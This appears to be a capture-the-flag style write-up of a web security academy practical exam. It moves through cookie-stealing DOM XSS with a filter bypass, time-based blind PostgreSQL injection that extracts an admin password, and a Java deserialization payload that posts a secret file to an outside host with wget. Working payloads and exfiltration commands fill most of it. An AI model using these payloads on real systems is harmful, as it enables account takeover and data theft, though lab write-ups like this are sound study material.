# Foothold

Active Scan => DOM-XSS => "-alert(1)-"

![image](https://user-images.githubusercontent.com/40497633/233626048-0866c789-cc7c-4278-ae84-721bbfa8ef41.png)

![image](https://user-images.githubusercontent.com/40497633/233626299-da46ddec-1288-49fe-a557-3380039229c0.png)
dots are blocked => first bypass to get cookie => alert(document['cookie'])


![image](https://user-images.githubusercontent.com/40497633/233626763-d3d2cd7d-1359-4f72-8ba5-f295416ce4c0.png)

Cannot exfiltrate data as dots are needed for the burp collab domain so we have to use atob to use it as base64.

Exploit:
"-eval(atob('[base64 encoded payload]'))-"

base64 payload:
fetch('https://your.burp.oastify.com?cookie='+document.cookie)
![image](https://user-images.githubusercontent.com/40497633/233627758-d03b4789-a4b6-4df0-a91e-d4fde369023a.png)

Exploit server:
<script>
    document.location="https://LAB-ID.h1-web-security-academy.net/?SearchTerm=%22-eval(atob(%27[base64 encoded payload]%27))-%22czichiz"
</script>

![image](https://user-images.githubusercontent.com/40497633/233628564-3c1729fa-30c9-41d2-9edd-89d1cbcf82a9.png)

Carlos account takeover!

![image](https://user-images.githubusercontent.com/40497633/233628748-0e921ccd-22d8-4042-a212-9b277b44de73.png)


# Privesc

Active scan on new advanced search feature only accessible with user account => PostgreSQL injection on param sort-by

PostgreSQL: PostgreSQL 12.14 (Ubuntu 12.14-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit 

Automatic with sqlmap:

sqlmap.py -u "https://LAB-ID.h1-web-security-academy.net:443/filtered_search?SearchTerm=test&sort-by=DATE&writer=" --cookie="_lab=48%7cMC4CFQCUigHc10K7RPnpgqQELxmnJC1XtAIVAIjxga6lfvULTXA5Pbqay2che1mf23VpCwRs7bp8k0P0WAnCIJh1MEhnSS%2b7xWrrVBgesSt08Mm7GHU6AMaFuhNMV79n6urUwKDt%2bvAmBTwIDGNzN3EcnM5lqarXKPo0JzTNR0i9BdZIvvAYXA%3d%3d; session=97xXNPN8LvO14nMh3tQLARSy47O67rgV" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36" --referer="https://0ad500100381b261800cf872003800f1.h1-web-security-academy.net/filtered_search?SearchTerm=test&sort-by=DATE&writer=" --delay=0 --timeout=30 --retries=0 -p "sort-by" --level=3 --risk=1 --threads=1 --time-sec=5 -b --batch --current-user

sqlmap find boolean-based SQLi

manual:
Detection with time-based blind SQLi:
sort-by=DATE;SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END--

![image](https://user-images.githubusercontent.com/40497633/233630036-b0f18f22-36d5-4e93-9d38-d8a63658da5e.png)


Find password lenght:
sort-by=DATE;SELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>$20$)+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--

![image](https://user-images.githubusercontent.com/40497633/233630972-9d0c611e-6f37-458f-8fdc-ba2e5233c144.png)


20 cars

Find password:
sort-by=DATE;SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,$1$,1)='$a$')+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--

![image](https://user-images.githubusercontent.com/40497633/233631386-ddf5a1da-c494-4942-a58d-5c53c868aa30.png)
![image](https://user-images.githubusercontent.com/40497633/233631517-fbbc06d0-1dc7-4886-ae9f-89347e25d57f.png)
![image](https://user-images.githubusercontent.com/40497633/233631598-4bd414ff-a32f-493d-b288-bebf8050dd6c.png)

![image](https://user-images.githubusercontent.com/40497633/233632259-3a0fcab8-dced-4286-bfe1-641aeeb223b5.png)

1234567891011121314151617181920 </br>
b9v9whchew y p e w t l 1 y g v

creds admin: </br>
login: administrator </br>
password: b9v9whchewypewtl1ygv </br>

Administrator account takeover!

![image](https://user-images.githubusercontent.com/40497633/233632577-10e78dca-ac22-4393-88e2-4b3161f3841c.png)


# Data exfiltration

New feature => admin panel => delete users => list of blogs with title/author/views

checklist:

- SQLi => possible - (no interactions on admin panel so only possibility in headers)
- XXE => not possible cause no interactions on admin panel
- SSRF => possible only in headers
- OS injection => possible only on headers
- Deserial => possible + (Cookie look java serialized)
- File upload => not possible (no file upload feature)

View-source => clean 

exfiltration:

Insecure deserialization of admin-prefs cookie

H4sIAAAAAAAA%2fzWPPU7DQBCFF0RSQcMJpkOi2PTQEH4iCkcKClJEOV6Pk8HrHbO7dmKQOA4VJ%2bAI3IU7sBahm%2fn09PS9zx81Cl6dW8w1msjigjZS1%2bJ0IM9o%2bRVzS3pa1OwWnsrw9vUxDqvv7FAdZeq4xE48R5qJFFGdZs%2fY4cSiW0%2bW0bNbX2bq5D%2fz0EqkF%2fWuDvawHei1SLWHo7ih%2bi%2bxa6Iab5kc%2baiu5j04rAk4wA16KwHm4qL0qOFJWqjYWiqg7qHEVOE1JNMGPUEUKJh0VIvHDcGKcpg2jWWDw1K4R1ORPwvpcEWePC7gloORjgZ1SBDudo0VjsO7JDMI9zCzuA1JT3zaSb9PDWuHQgEAAA%3d%3d

![image](https://user-images.githubusercontent.com/40497633/233638562-a97e2955-c3f2-4d89-8475-1e01f8a00767.png)


extension Java deserialisation scanner => exploitation 

![image](https://user-images.githubusercontent.com/40497633/233633030-60e1c7bd-e027-457a-8f42-b6dabbf77025.png)


Compress using gzip + Encode using Base64 + Encode using URL encoding

Payload: CommonsCollections7 'wget https://your.burp.oastify.com --post-file=/home/carlos/secret'

![image](https://user-images.githubusercontent.com/40497633/233633752-42f9ab49-33e5-402b-ba27-992a27f24541.png)

Received request data => solution-NMN8OGrvOL0ehJ5wqoNWIGTWPwaTZZ8Z

![image](https://user-images.githubusercontent.com/40497633/233633925-7d79152e-d7c9-4f32-a3c7-8350140b6158.png)


/!\ Configure the path to the ysoserial.jar file in the extension config and use another version of ysoserial if that doesn't work.

Practical Exam Completed !

![image](https://user-images.githubusercontent.com/40497633/233634102-07d01a1c-a211-4af8-9a77-bf7a8572774e.png)

